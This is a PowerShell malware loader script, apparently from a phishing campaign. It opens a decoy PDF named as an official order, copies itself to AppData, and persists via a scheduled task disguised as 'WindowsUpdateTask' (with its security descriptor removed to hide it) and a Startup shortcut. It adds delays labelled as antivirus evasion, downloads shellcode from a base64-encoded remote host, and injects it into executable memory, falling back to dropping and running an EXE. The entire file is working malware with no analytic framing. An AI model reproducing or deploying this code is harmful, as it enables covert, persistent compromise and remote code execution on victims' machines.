$ErrorActionPreference = 'SilentlyContinue'

# === QUICK DECOY PDF OPEN (IMMEDIATE) ===
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$flagFile = "$cache\installed.flag"
$isFirstRun = -not (Test-Path $flagFile)

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

if ($isFirstRun) {
    if (-not (Test-Path $pdfPath)) {
        try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
    }
    if (Test-Path $pdfPath) {
        try { Start-Process $pdfPath } catch {}
        New-Item -Path $flagFile -ItemType File -Force | Out-Null
    }
}

# === SELF-PRESERVATION ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch { exit }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}
$scriptPath = Save-ScriptToDisk -Destination $localPath

# === PERSISTENCE: Scheduled Task ===
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    try {
        $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
    } catch {}
}

# === PERSISTENCE: Startup LNK ===
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wshShell = New-Object -ComObject WScript.Shell
    $shortcut = $wshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $shortcut.WindowStyle = 7
    $shortcut.Save()
}

# === POST-REBOOT DELAY (Only on persistence runs) ===
if (-not $isFirstRun) {
    $rebootDelay = Get-Random -Min 600 -Max 900   # 10-15 minutes
    Start-Sleep -Seconds $rebootDelay
}

# === BEARFOOS EVASION: Delay before payload ===
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# === FILELESS SHELLCODE INJECTION ===
$shellcodeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))

try {
    # Download shellcode to memory
    $sc = (New-Object Net.WebClient).DownloadData($shellcodeUrl)
    
    # P/Invoke for injection
    $k32 = Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
"@ -Name 'K32' -Namespace 'Win32' -PassThru
    
    # Allocate RWX memory and copy shellcode
    $addr = $k32::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
    
    # Execute in new thread
    $thread = $k32::CreateThread(0, 0, $addr, 0, 0, 0)
    $k32::WaitForSingleObject($thread, 0) | Out-Null
    
} catch {
    # Fallback: Write to disk only if injection fails
    $fallbackPath = "$cache\helper.exe"
    [System.IO.File]::WriteAllBytes($fallbackPath, $sc)
    Start-Process $fallbackPath -WindowStyle Hidden
}

# === CLEANUP (PDF only - no EXE on disk) ===
Start-Job -ScriptBlock { param($pdf) Start-Sleep -Seconds 300; Remove-Item $pdf -Force -ErrorAction SilentlyContinue } -ArgumentList $pdfPath | Out-Null
